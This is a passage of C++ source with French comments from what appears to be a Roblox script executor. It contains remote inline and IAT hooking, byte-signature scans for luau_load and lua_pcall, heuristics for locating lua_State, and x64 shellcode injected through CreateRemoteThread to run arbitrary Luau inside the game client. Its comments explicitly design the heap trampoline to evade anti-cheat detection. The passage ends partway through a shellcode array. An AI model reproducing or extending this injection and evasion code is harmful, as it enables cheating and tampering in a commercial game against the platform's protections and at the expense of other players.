    DWORD tmp = 0; VirtualProtectEx(hProcess, reinterpret_cast<LPVOID>(h.target), len, oldProt, &tmp);
    if (ok) FlushInstructionCache(hProcess, reinterpret_cast<LPVOID>(h.target), len);
    VirtualFreeEx(hProcess, reinterpret_cast<LPVOID>(h.trampoline), 0, MEM_RELEASE);
    return ok;
}

// Ordre d'usage pour que le détour rappelle l'original :
//   1) écris ton stub-détour avec 8 octets réservés (placeholder) pour l'adresse
//      de trampoline, via AllocateAndWriteStub ;
//   2) auto h = InstallInlineHook(proc, target, detourAddr);
//   3) WriteProcessMemory(proc, detourAddr + offsetDuPlaceholder,
//                         &h->trampoline, 8, ...);
// Le gel des threads est fait par InstallInlineHook (freezeThreads = true).

// ===========================================================================
// Hook de la table d'import (IAT) — in-process (depuis une DLL injectée).
// Plus propre qu'un inline pour une API importée : swap de pointeur, pas de
// disasm. Cas GameMaker : intercepter Winsock (ws2_32.dll) appelé par le runner.
// ===========================================================================

// Remplace l'entrée IAT de `funcName` (importée de `importDll`, ou de n'importe
// quel module si importDll == nullptr) dans `module` (nullptr = .exe principal).
// Renvoie l'ancien pointeur dans *outOriginal. Déhook : rappeler avec l'ancien.
inline bool HookIAT(HMODULE module, const char* importDll, const char* funcName,
                    void* newFunc, void** outOriginal) {
    BYTE* base = reinterpret_cast<BYTE*>(module ? module : GetModuleHandleW(nullptr));
    auto dos = reinterpret_cast<IMAGE_DOS_HEADER*>(base);
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return false;
    auto nt = reinterpret_cast<IMAGE_NT_HEADERS*>(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return false;

    const auto& dir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (!dir.VirtualAddress) return false;
    auto imp = reinterpret_cast<IMAGE_IMPORT_DESCRIPTOR*>(base + dir.VirtualAddress);

    for (; imp->Name; ++imp) {
        const char* dll = reinterpret_cast<const char*>(base + imp->Name);
        if (importDll && _stricmp(dll, importDll) != 0) continue;

        // OriginalFirstThunk (INT) porte les noms ; FirstThunk (IAT) les adresses.
        // Si l'INT est absent (import lié), on retombe sur l'IAT.
        auto* names = reinterpret_cast<IMAGE_THUNK_DATA*>(
            base + (imp->OriginalFirstThunk ? imp->OriginalFirstThunk : imp->FirstThunk));
        auto* iat = reinterpret_cast<IMAGE_THUNK_DATA*>(base + imp->FirstThunk);

        for (; names->u1.AddressOfData; ++names, ++iat) {
            if (IMAGE_SNAP_BY_ORDINAL(names->u1.Ordinal)) continue;  // import par ordinal
            auto* byName = reinterpret_cast<IMAGE_IMPORT_BY_NAME*>(base + names->u1.AddressOfData);
            if (std::strcmp(reinterpret_cast<const char*>(byName->Name), funcName) != 0) continue;

            void** slot = reinterpret_cast<void**>(&iat->u1.Function);
            DWORD oldProt = 0;
            if (!VirtualProtect(slot, sizeof(void*), PAGE_READWRITE, &oldProt)) return false;
            if (outOriginal) *outOriginal = *slot;
            *slot = newFunc;
            VirtualProtect(slot, sizeof(void*), oldProt, &oldProt);
            return true;
        }
    }
    return false;  // fonction non trouvée dans l'IAT (peut-être résolue par GetProcAddress)
}
#endif // _WIN32

// ===========================================================================
// Variante MinHook (dans une DLL injectée) — recommandée dès que l'injection
// est possible : le hook tourne DANS la cible, le détour est une fonction C et
// « appeler l'original » est un simple pointeur. Link : MinHook.x64.lib
// ---------------------------------------------------------------------------
// #include <MinHook.h>
// using Fn = int (*)(void* self, int arg);   // signature réelle à reconstituer
// static Fn oOriginal = nullptr;             // MinHook y écrit la trampoline
// int __fastcall hkDetour(void* self, int arg) {
//     int r = oOriginal(self, arg);          // appelle l'original
//     return r;
// }
// bool InstallWithMinHook(void* pTarget) {
//     if (MH_Initialize() != MH_OK) return false;
//     if (MH_CreateHook(pTarget, (void*)&hkDetour, (void**)&oOriginal) != MH_OK) return false;
//     return MH_EnableHook(pTarget) == MH_OK; // patch atomique + threads gérés
// }
// pTarget se résout in-process : FindPatternInProcess(textStart, textEnd, *pattern)
// sur la section .text du module (GetModuleHandleW(nullptr) pour le .exe du jeu).
// ===========================================================================

#ifdef _WIN32
// ===========================================================================
// VM Luau — POINT D'ENTRÉE CŒUR (exécuteur Roblox)
// ---------------------------------------------------------------------------
// 1) Scan par signatures dans la mémoire RÉSIDENTE du module Roblox pour
//    localiser :
//      - luau_load          (compilateur de bytecode / source) ;
//      - lua_pcall/rbx_pcall(exécution de la closure chargée) ;
//    puis récupérer le lua_State via trois cascades :
//      a) piles des threads scripts courants (TEB scan) ;
//      b) sections DATA du module (scan brut des pointeurs) ;
//      c) className "DataModel" dans le class registry + voisinage (±0x400)
//         de la string pour retrouver l'objet DataModel et son lua_State.
// 2) --loadstring : TRAMPOLINE HEAP (feature 3) — AUCUN patch du .text.
//    Un bloc RW (LuauTrampBlock) est alloué dans la cible avec "=executor\0"
//    et le source ; un stub EXECUTE_READWRITE en heap l'appelle. Ce stub
//    invoke luau_load puis lua_pcall directement — aucun hook, aucune
//    signature anti-cheat ne vise les allocations MEM_PRIVATE non-images.
//    L'ancien hook inline (InstallLoadstringHook, qui patchait le prologue
//    de luau_load dans .text) est conservé en DÉPRÉCIÉ pour référence.
// 3) Exécution : luau_load(L, "=executor", src, len, 0) puis
//    lua_pcall(L, 0, -1, 0) via un stub shellcode lancé par
//    CreateRemoteThread. Une fois dans le jeu, game:GetService,
//    PromptProductPurchase, task.wait… sont des appels NATIFS du vrai
//    environnement → le snippet tourne tel quel.
// NOTE : les signatures dépendent de la VERSION de Roblox. À re-extraire
// (IDA/Ghidra) à chaque mise à jour ; sinon fournir les adresses en hexa :
//   aob.exe --luau-vm <pid> 0xLUAU_LOAD 0xLUA_PCALL 0xLUA_STATE
// ===========================================================================

struct ModuleInfo {
    uintptr_t   base;
    size_t      size;
    std::wstring name;
};

// Liste les modules (DLL/EXE) chargés dans un processus distant.
std::vector<ModuleInfo> EnumModules(DWORD pid) {
    std::vector<ModuleInfo> mods;
    UniqueHandle snap(CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid));
    if (snap.get() == INVALID_HANDLE_VALUE) return mods;
    MODULEENTRY32W me{};
    me.dwSize = sizeof(me);
    for (BOOL ok = Module32FirstW(snap.get(), &me); ok; ok = Module32NextW(snap.get(), &me))
        mods.push_back({reinterpret_cast<uintptr_t>(me.modBaseAddr), me.modBaseSize, me.szModule});
    return mods;
}

// Scan d'une plage [start,end) d'un process distant, chunk par chunk avec
// chevauchement (base : FindAllPatternsInRemoteProcess, limité au module).
std::optional<uintptr_t> FindPatternInRemoteRange(HANDLE proc, uintptr_t start, uintptr_t end,
                                                  const Pattern& pattern) {
    if (!proc || pattern.empty() || start >= end) return std::nullopt;
    const size_t n = pattern.size();
    const size_t kChunk = size_t{1} << 20;
    std::vector<uint8_t> buffer;
    uintptr_t result = 0;
    bool found = false;

    MEMORY_BASIC_INFORMATION mbi{};
    uintptr_t addr = start;
    while (addr < end &&
           VirtualQueryEx(proc, reinterpret_cast<LPCVOID>(addr), &mbi, sizeof(mbi)) == sizeof(mbi)) {
        uintptr_t rb = reinterpret_cast<uintptr_t>(mbi.BaseAddress);
        uintptr_t re = rb + mbi.RegionSize;
        if (re <= addr) break;
        if (IsReadableRegion(mbi)) {
            uintptr_t from = (std::max)(addr, rb);
            uintptr_t to   = (std::min)(end, re);
            for (uintptr_t chunk = from; chunk < to && !found; chunk += kChunk) {
                size_t want = (std::min)(uintptr_t(kChunk + n - 1), to - chunk);
                buffer.resize(want);
                SIZE_T got = 0;
                if (ReadProcessMemory(proc, reinterpret_cast<LPCVOID>(chunk), buffer.data(), want, &got)) {
                    if (auto off = FindPattern(buffer.data(), got, pattern)) {
                        result = chunk + *off;
                        found = true;
                        break;
                    }
                    continue;
                }
                // repli page par page (région partiellement illisible)
                const size_t kPage = 0x1000;
                for (size_t off = 0; off < want && !found; off += kPage) {
                    size_t len = (std::min)(kPage, want - off);
                    if (ReadProcessMemory(proc, reinterpret_cast<LPCVOID>(chunk + off),
                                          buffer.data(), len, &got))
                        if (auto r = FindPattern(buffer.data(), got, pattern)) {
                            result = chunk + off + *r;
                            found = true;
                        }
                }
            }
        }
        addr = re;
    }
    return found ? std::optional<uintptr_t>(result) : std::nullopt;
}

// Lit un mot (8 octets) distant de façon sûre.
inline bool ReadRemotePtr(HANDLE proc, uintptr_t addr, uintptr_t& out) {
    SIZE_T r = 0;
    return ReadProcessMemory(proc, reinterpret_cast<LPCVOID>(addr), &out, sizeof(out), &r) && r == sizeof(out);
}

// Heuristique lua_State (layout Luau, hérité de Lua 5.1 — stable) :
//   +0x00 next ; +0x08 tt == LUA_TTHREAD (8) ; +0x09 marked ; +0x0A status
//   +0x10 top ; +0x18 global_State* ; +0x30 stack_last ; +0x38 stack
// Fast-path : 1 lecture de 9 octets (couverture de tt), puis les champs utiles.
bool IsPlausibleLuaState(HANDLE proc, uintptr_t addr) {
    if (!addr || (addr & 7)) return false;
    uint8_t head[9]{};
    SIZE_T got = 0;
    if (!ReadProcessMemory(proc, reinterpret_cast<LPCVOID>(addr), head, sizeof(head), &got) || got != sizeof(head))
        return false;
    if (head[8] != 8) return false;   // tt != LUA_TTHREAD

    uintptr_t top = 0, g = 0, slast = 0, st = 0;
    if (!ReadRemotePtr(proc, addr + 0x10, top) || !ReadRemotePtr(proc, addr + 0x18, g)) return false;
    ReadRemotePtr(proc, addr + 0x30, slast);
    ReadRemotePtr(proc, addr + 0x38, st);
    if (top < 0x10000 || g < 0x10000) return false;
    if (st && slast && st > slast) return false;   // pile incohérente
    return true;
}

// Signature exportée de NtQueryInformationThread (pas besoin de linker ntdll).
typedef LONG(NTAPI* PFN_NtQueryInformationThread)(HANDLE, ULONG, PVOID, ULONG, PULONG);

// Cherche un lua_State « thread script courant » : les threads scripts Roblox
// gardent leur lua_State* en pile ; on balaie les stacks via le TEB
// (StackBase/StackLimit) et on valide chaque qword candidat.
// `outTid` (optionnel) reçoit le TID du thread qui portait ce lua_State : c'est
// LE thread qu'un hijack doit détourner (luau_load doit tourner dans son thread).
uintptr_t FindLuaStateFromScriptThreads(DWORD pid, DWORD* outTid = nullptr) {
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) return 0;
    auto NtQI = reinterpret_cast<PFN_NtQueryInformationThread>(GetProcAddress(ntdll, "NtQueryInformationThread"));
    if (!NtQI) return 0;

    HANDLE proc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
    if (!proc) return 0;
    UniqueHandle hp(proc);

    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    THREADENTRY32 te{};
    te.dwSize = sizeof(te);
    std::vector<uint8_t> page(0x1000);

    for (BOOL ok = Thread32First(snap, &te); ok; ok = Thread32Next(snap, &te)) {
        if (te.th32OwnerProcessID != pid) continue;
        UniqueHandle th(OpenThread(THREAD_QUERY_INFORMATION, FALSE, te.th32ThreadID));
        if (!th) continue;

        // THREAD_BASIC_INFORMATION : ExitStatus(+0), TebBaseAddress(+8)…
        uintptr_t teb = 0;
        {
            struct Tbi { ULONG_PTR q[4]; } info{};
            ULONG len = 0;
            if (NtQI(th.get(), 0 /*ThreadBasicInformation*/, &info, sizeof(info), &len) == 0)
                teb = info.q[1];
        }
        if (!teb) continue;
        uintptr_t stackBase = 0, stackLimit = 0;
        if (!ReadRemotePtr(hp.get(), teb + 0x08, stackBase)) continue;   // NT_TIB.StackBase
        if (!ReadRemotePtr(hp.get(), teb + 0x10, stackLimit)) continue;  // NT_TIB.StackLimit
        if (stackBase <= stackLimit) continue;

        for (uintptr_t a = stackLimit; a < stackBase; a += 0x1000) {
            SIZE_T got = 0;
            size_t want = (std::min)(size_t{0x1000}, static_cast<size_t>(stackBase - a));
            if (!ReadProcessMemory(hp.get(), reinterpret_cast<LPCVOID>(a), page.data(), want, &got)) continue;
            for (size_t off = 0; off + 8 <= got; off += 8) {
                uintptr_t cand = 0;
                std::memcpy(&cand, page.data() + off, 8);
                if (cand && IsPlausibleLuaState(hp.get(), cand)) {
                    if (outTid) *outTid = te.th32ThreadID;
                    CloseHandle(snap);
                    return cand;
                }
            }
        }
    }
    CloseHandle(snap);
    return 0;
}

// Fallback DataModel : le pointeur vers le lua_State principal (ou la table
// de globals) vit en .data/.rdata du module ; on balaie les sections DATA
// (hors code) et on teste chaque qword comme candidat lua_State.
uintptr_t FindLuaStateInModule(HANDLE proc, const ModuleInfo& mod) {
    if (!proc || mod.size == 0) return 0;
    const uintptr_t end = mod.base + mod.size;
    const size_t kChunk = size_t{1} << 20;
    std::vector<uint8_t> buffer;

    MEMORY_BASIC_INFORMATION mbi{};
    uintptr_t addr = mod.base;
    while (addr < end &&
           VirtualQueryEx(proc, reinterpret_cast<LPCVOID>(addr), &mbi, sizeof(mbi)) == sizeof(mbi)) {
        uintptr_t rb = reinterpret_cast<uintptr_t>(mbi.BaseAddress);
        uintptr_t re = rb + mbi.RegionSize;
        if (re <= addr) break;
        // seulement les sections données (PAGE_EXECUTE* exclu) : c'est là que
        // vivent les pointeurs vers le lua_State statique.
        if (IsReadableRegion(mbi) && !(mbi.Protect & (PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE |
                                                      PAGE_EXECUTE_WRITECOPY))) {
            for (uintptr_t chunk = rb; chunk < re; chunk += kChunk) {
                size_t want = (std::min)(uintptr_t(kChunk), re - chunk);
                buffer.resize(want);
                SIZE_T got = 0;
                if (!ReadProcessMemory(proc, reinterpret_cast<LPCVOID>(chunk), buffer.data(), want, &got))
                    continue;
                for (size_t off = 0; off + 8 <= got; off += 8) {
                    uintptr_t cand = 0;
                    std::memcpy(&cand, buffer.data() + off, 8);
                    if (cand && IsPlausibleLuaState(proc, cand))
                        return cand;
                }
            }
        }
        addr = re;
    }
    return 0;
}

// Dernier recours — récupération de l'état via l'ARBRE D'INSTANCES DataModel :
// le className "DataModel" (toujours présent, stocké par la factory/le class
// registry) vit dans les sections data du module ; le lua_State global gravite
// dans le voisinage de ce pointeur (objet Datamodel persistant en heap).
bool FindDataModelClassNames(HANDLE proc, const ModuleInfo& mod,
                             std::vector<uintptr_t>& outHits) {
    outHits.clear();
    if (!proc || mod.size == 0) return false;
    static const char kName[] = "DataModel";
    const size_t kNeedleLen = sizeof(kName) - 1;
    const uintptr_t end = mod.base + mod.size;
    const size_t kChunk = size_t{1} << 20;
    std::vector<uint8_t> buffer;

    MEMORY_BASIC_INFORMATION mbi{};
    uintptr_t addr = mod.base;
    while (addr < end &&
           VirtualQueryEx(proc, reinterpret_cast<LPCVOID>(addr), &mbi, sizeof(mbi)) == sizeof(mbi)) {
        uintptr_t rb = reinterpret_cast<uintptr_t>(mbi.BaseAddress);
        uintptr_t re = rb + mbi.RegionSize;
        if (re <= addr) break;
        if (IsReadableRegion(mbi) && !(mbi.Protect & (PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE |
                                                      PAGE_EXECUTE_WRITECOPY))) {
            for (uintptr_t chunk = rb; chunk < re; chunk += kChunk) {
                size_t want = (std::min)(uintptr_t(kChunk), re - chunk);
                buffer.resize(want);
                SIZE_T got = 0;
                if (!ReadProcessMemory(proc, reinterpret_cast<LPCVOID>(chunk), buffer.data(), want, &got))
                    continue;
                for (size_t off = 0; off + kNeedleLen <= got; ++off)
                    if (std::memcmp(buffer.data() + off, kName, kNeedleLen) == 0)
                        outHits.push_back(chunk + off);
            }
        }
        addr = re;
    }
    return !outHits.empty();
}

uintptr_t FindLuaStateInDataModel(HANDLE proc, const ModuleInfo& mod) {
    std::vector<uintptr_t> hits;
    if (!FindDataModelClassNames(proc, mod, hits)) return 0;
    const uintptr_t kWindow = 0x400;   // voisinage autour de la string className
    for (uintptr_t hit : hits) {
        uintptr_t lo = (hit >= kWindow ? hit - kWindow : 0) & ~uintptr_t(7);
        uintptr_t hi = hit + kWindow;
        for (uintptr_t a = lo; a <= hi; a += 8) {
            uintptr_t cand = 0;
            SIZE_T got = 0;
            if (!ReadProcessMemory(proc, reinterpret_cast<LPCVOID>(a), &cand, sizeof(cand), &got) ||
                got != sizeof(cand))
                continue;
            // le lua_State vit en heap, JAMAIS dans la plage d'image du module
            if (cand && cand >= mod.base && cand < mod.base + mod.size) continue;
            if (cand && IsPlausibleLuaState(proc, cand)) {
                std::cout << "[state] DataModel : lua_State 0x" << std::hex << cand
                          << " (proche className @ 0x" << hit << ")\n" << std::dec;
                return cand;
            }
        }
    }
    return 0;
}

const ModuleInfo* ChooseRobloxModule(const std::vector<ModuleInfo>& mods) {
    auto hasLower = [](const std::wstring& s, const wchar_t* sub) {
        std::wstring n, m(sub);
        for (wchar_t c : s) n.push_back((c >= L'A' && c <= L'Z') ? static_cast<wchar_t>(c + 32) : c);
        for (wchar_t& c : m) if (c >= L'A' && c <= L'Z') c = static_cast<wchar_t>(c + 32);
        return n.find(m) != std::wstring::npos;
    };
    for (const auto& m : mods)
        if (hasLower(m.name, L"RobloxPlayerBeta") || hasLower(m.name, L"RobloxStudio")) return &m;
    for (const auto& m : mods)
        if (hasLower(m.name, L"Roblox") || hasLower(m.name, L"Luau")) return &m;
    return nullptr;
}

std::optional<DWORD> ResolveTargetPid(std::string_view target) {
    bool digits = !target.empty() && std::all_of(target.begin(), target.end(),
                                                 [](char c) { return c >= '0' && c <= '9'; });
    if (digits) {
        unsigned long v = std::strtoul(target.data(), nullptr, 10);
        return v ? std::optional<DWORD>(static_cast<DWORD>(v)) : std::nullopt;
    }
    auto procs = FindProcessesByName(target);
    if (procs.size() == 1) {
        std::cout << "\"" << target << "\" -> PID " << procs.front().pid << '\n';
        return procs.front().pid;
    }
    return std::nullopt;
}

// ---------------------------------------------------------------------------
// Signatures x64 Roblox — À METTRE À JOUR À CHAQUE VERSION DE ROBLOX.
// Armes : IDA/Ghidra, module = RobloxPlayerBeta.dll (client) ou
// RobloxStudioBeta.exe. Les prologues réels changent ; ces exemples sont le
// squelette standard (save regs + sub rsp) à recalibrer.
// ---------------------------------------------------------------------------
namespace LuauEscapeSigs {
    // ------------------------------------------------------------------
    // Signatures à ESSAYER EN CASCADE (résolution automatique) : le prologue
    // change à chaque build. Ajoute/retire des variantes ici, AUCUN code à
    // modifier ailleurs. L'ordre = priorité (première qui matche = gagnante).
    //   luau_load    : push rbx; sub rsp,30h; mov rbx,rcx (+ fin du prologue
    //                  qui varie : mov r9,r8 / mov [rsp+20],rbx / push rdi...)
    //   lua_pcall    : variantes « save regs + sub rsp »
    //   rbx_pcall    : wrapper Roblox de lua_pcall (appels internes)
    // ------------------------------------------------------------------
    inline const std::vector<const char*> kLuauLoad = {
        "40 53 48 83 EC 30 48 8B D9 49 8B C8",            // historique / communauté
        "40 53 48 83 EC 30 48 8B D9",                     // prologue court (robuste)
        "48 89 5C 24 08 57 48 83 EC 30 48 8B D9",         // save rbx + push rdi
        "40 57 48 83 EC 30 48 8B D9",                     // push rdi + sub rsp
        "48 8B C4 48 89 58 20 57 48 83 EC 30 48 8B D9",   // mov [rsp+20],rbx
    };
    inline const std::vector<const char*> kLuaPcall = {
        "48 89 5C 24 ?? 48 89 6C 24 ?? 48 89 74 24 ?? 57 48 83 EC 30",
        "48 89 5C 24 ?? 57 48 83 EC 30",
    };
    inline const std::vector<const char*> kRbxPcall = {
        "48 89 5C 24 ?? 48 89 74 24 ?? 55 57 41 54 41 56 48 8D 6C 24 ??",
    };
}

// ---------------------------------------------------------------------------
// Stockage PERSISTANT des signatures (luau_sigs.txt, généré par --sig-update).
// Relu à chaque lancement : les signatures du fichier sont essayées EN PREMIER
// dans la cascade (elles sont les plus récentes), puis les signatures
// intégrées. Une signature sur son propre fichier se maintient de build en
// build tant que son prologue ne change pas.
// ---------------------------------------------------------------------------
namespace SigStore {
    inline const char* kSigFile = "luau_sigs.txt";

    std::vector<std::string> LoadFile() {
        std::vector<std::string> out;
        std::ifstream f(kSigFile);
        if (!f) return out;
        std::string line;
        while (std::getline(f, line)) {
            while (!line.empty() && (line.back() == '\r' || line.back() == '\n')) line.pop_back();
            if (line.empty() || line[0] == '#') continue;
            out.push_back(line);
        }
        return out;
    }

    // Liste en cascade : signatures du fichier d'abord, intégrées ensuite.
    const std::vector<const char*>& LuauLoad() {
        static const std::vector<std::string> saved = LoadFile();
        static const std::vector<const char*> merged = [] {
            std::vector<const char*> v;
            for (const auto& s : saved) v.push_back(s.c_str());
            for (const char* s : LuauEscapeSigs::kLuauLoad) v.push_back(s);
            return v;
        }();
        return merged;
    }

    // Ajoute une signature au fichier (sans doublon). Retourne true si OK.
    bool Append(const std::string& sig) {
        for (const auto& s : LoadFile())
            if (s == sig) return true;
        std::ofstream f(kSigFile, std::ios::app);
        if (!f) return false;
        f << sig << '\n';
        return true;
    }
}

bool ResolveLuauFunction(HANDLE proc, const ModuleInfo& mod, const char* sig,
                         uintptr_t& out, const char* label) {
    auto pat = ParsePattern(sig);
    if (!pat) return false;
    auto hit = FindPatternInRemoteRange(proc, mod.base, mod.base + mod.size, *pat);
    if (!hit) {
        std::cerr << "[scan] " << label << " introuvable avec la signature actuelle.\n";
        return false;
    }
    out = *hit;
    std::cout << "[scan] " << label << " @ 0x" << std::hex << out << std::dec << '\n';
    return true;
}

// Résolution AUTOMATIQUE : essaie les signatures de `sigs` (LuauEscapeSigs)
// dans l'ordre et garde la première qui matche. Si aucune ne matche, log
// explicite des signatures → mets à jour la liste dans LuauEscapeSigs.
// Deux variantes d'une même signature peuvent matcher : on affiche l'index
// pour pister quelle cible de build est active.
std::vector<uintptr_t> FindAllPatternsInRemoteRange(HANDLE proc, uintptr_t start, uintptr_t end,
                                                    const Pattern& pattern);
bool ResolveLuauFunctionAny(HANDLE proc, const ModuleInfo& mod,
                            const std::vector<const char*>& sigs,
                            uintptr_t& out, const char* label) {
    if (sigs.empty()) return false;
    for (size_t i = 0; i < sigs.size(); ++i) {
        auto pat = ParsePattern(sigs[i]);
        if (!pat) continue;
        auto hit = FindPatternInRemoteRange(proc, mod.base, mod.base + mod.size, *pat);
        if (!hit) continue;
        out = *hit;
        std::cout << "[scan] " << label << " @ 0x" << std::hex << out << std::dec
                  << "  (joue par signature n" << (i + 1) << "/" << sigs.size() << ")\n";
        // Alertes d'ambiguïté : une signature doit être UNIQUE dans le module.
        // Si elle matche ailleurs, la cible peut être un copy-paste / build obsolette.
        if (std::strcmp(label, "luau_load") == 0) {
            auto all = FindAllPatternsInRemoteRange(proc, mod.base, mod.base + mod.size, *pat);
            if (all.size() > 1) {
                std::cout << "  [!] ATTENTION : cette signature matche " << all.size()
                          << " emplacements dans le module :";
                for (size_t k = 0; k < all.size(); ++k) {
                    std::cout << " 0x" << std::hex << all[k] << std::dec;
                    if (k >= 4) { std::cout << " ..."; break; }
                }
                std::cout << "\n      -> relance --sig-update pour choisir la bonne adresse.\n";
            }
        }
        return true;
    }
    std::cerr << "[scan] " << label << " introuvable : " << sigs.size()
              << " signature(s) essayee(s) sans match.\n"
              << "  -> mets a jour LuauEscapeSigs::k" << label << " (nouveau prologue)"
              << " avec Cheat Engine/x64dbg, ou passe l'adresse en hexa.\n";
    return false;
}

// Cascades communes : luau_load puis wrapper Roblox (rbx_pcall) en repli.
bool ResolveLuauVMFunctions(HANDLE proc, const ModuleInfo& mod, uintptr_t& load,
                            uintptr_t& pcall) {
    bool okLoad  = ResolveLuauFunctionAny(proc, mod, SigStore::LuauLoad(), load, "luau_load");
    bool okPcall = ResolveLuauFunctionAny(proc, mod, LuauEscapeSigs::kLuaPcall, pcall, "lua_pcall");
    if (!okPcall)
        okPcall = ResolveLuauFunctionAny(proc, mod, LuauEscapeSigs::kRbxPcall, pcall, "rbx_pcall");
    return okLoad && okPcall;
}

struct LuauVM {
    uintptr_t state              = 0;   // lua_State* (DataModel / thread script)
    uintptr_t luauLoad           = 0;   // luau_load
    uintptr_t luaPcall           = 0;   // lua_pcall / rbx_pcall
    bool      hookInstalled      = false;
    bool      loadstringEnabled  = false;   // DÉSACTIVÉ PAR DÉFAUT
    uintptr_t detourAddr         = 0;       // stub du hook dans la cible
    InlineHook loadHook{};                  // hook luau_load

    // Feature 3 : loadstring via TRAMPOLINE heap (AUCUN patch .text)
    bool      trampolineInstalled = false;  // trampoline allouée dans la cible
    uintptr_t trampolineFn        = 0;      // code du stub (heap EXECUTE_READWRITE)
    uintptr_t trampolineBlock     = 0;      // bloc RW partagé (LuauTrampBlock + payload)
};

// ---------------------------------------------------------------------------
// Hook luau_load — DÉPRÉCIÉ (feature 3) : remplacé par la trampoline heap sans
// patch de .text (voir InstallLoadstringTrampoline ci-dessous). Ce hook inline
// patche le prologue de luau_load (risqué pour l'anti-cheat) ; conservé pour
// référence/historique. Pass-through vers l'original : atteindre luau_load
// interne = accepter une string brute (contourne le wrapper Roblox).
// ---------------------------------------------------------------------------
static const uint8_t kLoadstringDetour[] = {
    0x48, 0x83, 0xEC, 0x28,                        // sub   rsp, 28h
    0xFF, 0x15, 0x02, 0x00, 0x00, 0x00,            // call  qword ptr [rip+2] -> trampoline
    0xEB, 0x08,                                     // jmp   +8 (saute le placeholder)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,// offset 12 : trampoline (patchée après hook)
    0x48, 0x83, 0xC4, 0x28,                        // add   rsp, 28h
    0xC3,                                           // ret
};
constexpr size_t kLoadstringDetourTrampOff = 12;

bool InstallLoadstringHook(HANDLE proc, LuauVM& vm) {
    if (vm.hookInstalled) return true;
    if (!proc || !vm.luauLoad) return false;
    LPVOID detour = AllocateAndWriteStub(proc, kLoadstringDetour, sizeof(kLoadstringDetour));
    if (!detour) return false;

    auto hook = InstallInlineHook(proc, vm.luauLoad, reinterpret_cast<uintptr_t>(detour));
    if (!hook) { VirtualFreeEx(proc, detour, 0, MEM_RELEASE); return false; }

    uintptr_t tramp = hook->trampoline;
    SIZE_T w = 0;
    WriteProcessMemory(proc, reinterpret_cast<uint8_t*>(detour) + kLoadstringDetourTrampOff,
                       &tramp, sizeof(tramp), &w);
    FlushInstructionCache(proc, detour, sizeof(kLoadstringDetour));

    vm.loadHook = std::move(*hook);
    vm.hookInstalled = true;
    vm.detourAddr = reinterpret_cast<uintptr_t>(detour);
    std::cout << "[hook] luau_load -> detour pass-through (trampoline 0x" << std::hex
              << tramp << std::dec << ")\n";
    return true;
}

bool RemoveLoadstringHook(HANDLE proc, LuauVM& vm) {
    if (!vm.hookInstalled) return true;
    bool ok = RemoveInlineHook(proc, vm.loadHook);
    if (vm.detourAddr) { VirtualFreeEx(proc, reinterpret_cast<LPVOID>(vm.detourAddr), 0, MEM_RELEASE); vm.detourAddr = 0; }
    if (ok) { vm.hookInstalled = false; vm.loadstringEnabled = false; }
    return ok;
}

void SetLoadstringEnabled(LuauVM& vm, bool on) { vm.loadstringEnabled = on; }

// ---------------------------------------------------------------------------
// Feature 3 : Loadstring via TRAMPOLINE HEAP (AUCUN patch .text)
// ---------------------------------------------------------------------------
// Le bloc RW partagé avec la cible stocke la structure <LuauTrampBlock> puis
// [ "=executor\0" ][ source\0 ] juste après (à partir de +0x40).
// Le stub heap (fnLoad/fnPcall lus depuis +0x30/+0x38) appelle les API natives
// sans toucher les pages d'image — aucune signature anti-cheat ne vise les
// blocs RW MEM_PRIVATE non-images. Comparé au hook inline InstallLoadstringHook
// qui patche le prologue de luau_load dans .text (très facilement détectable),
// la trampoline est : allocation privée, code en heap, libération totale en fin.
// ---------------------------------------------------------------------------
struct alignas(8) LuauTrampBlock {
    uintptr_t L;           // +0x00 lua_State*
    uintptr_t src;         // +0x08 source à compiler
    uintptr_t name;        // +0x10 chunkname
    uintptr_t size;        // +0x18 size_t
    int32_t   env;         // +0x20 environment (0 = globals)
    int32_t   loadStatus;  // +0x24 (out, -1 = pas encore exécuté)
    int32_t   pcallStatus; // +0x28 (out)
    int32_t   _pad;        // +0x2C (alignement)
    uintptr_t fnLoad;      // +0x30 luau_load*
    uintptr_t fnPcall;     // +0x38 lua_pcall*
};                        // +0x40 : "=executor\0" puis source (stockés hors struct)

// Shellcode x64 — word machine identique à kLuauExecStub mais lecture à des
// offsets propres au LuauTrampBlock (fnLoad à +0x30, fnPcall à +0x38).
// RCX = LuauTrampBlock*   (array automatique, pas sur la pile Windows x64)
static const uint8_t kLuauTrampFn[] = {
    0x53,                                       // push   rbx
    0x48, 0x83, 0xEC, 0x30,                    // sub    rsp, 30h
    0x48, 0x89, 0xCB,                          // mov    rbx, rcx            ; pArgs
    0x48, 0x8B, 0x0B,                          // mov    rcx, [rbx]          ; L
    0x48, 0x8B, 0x53, 0x10,                    // mov    rdx, [rbx+10h]      ; chunkname
    0x4C, 0x8B, 0x43, 0x08,                    // mov    r8,  [rbx+08h]      ; source
    0x4C, 0x8B, 0x4B, 0x18,                    // mov    r9,  [rbx+18h]      ; size
    0x8B, 0x43, 0x20,                          // mov    eax, [rbx+20h]      ; env
    0x48, 0x89, 0x44, 0x24, 0x20,              // mov    [rsp+20h], rax      ; 5e arg
    0xFF, 0x53, 0x30,                          // call   [rbx+30h]           ; luau_load
    0x89, 0x43, 0x24,                          // mov    [rbx+24h], eax      ; loadStatus
    0x85, 0xC0,                                // test   eax, eax
    0x75, 0x14,                                // jnz    +0x14 (saute pcall si load ≠ 0)
    0x48, 0x8B, 0x0B,                          // mov    rcx, [rbx]          ; L
    0x31, 0xD2,                                // xor    edx, edx            ; nargs = 0
    0x41, 0xB8, 0xFF, 0xFF, 0xFF, 0xFF,        // mov    r8d, -1             ; LUA_MULTRET
    0x45, 0x31, 0xC9,                          // xor    r9d, r9d            ; errfunc = 0
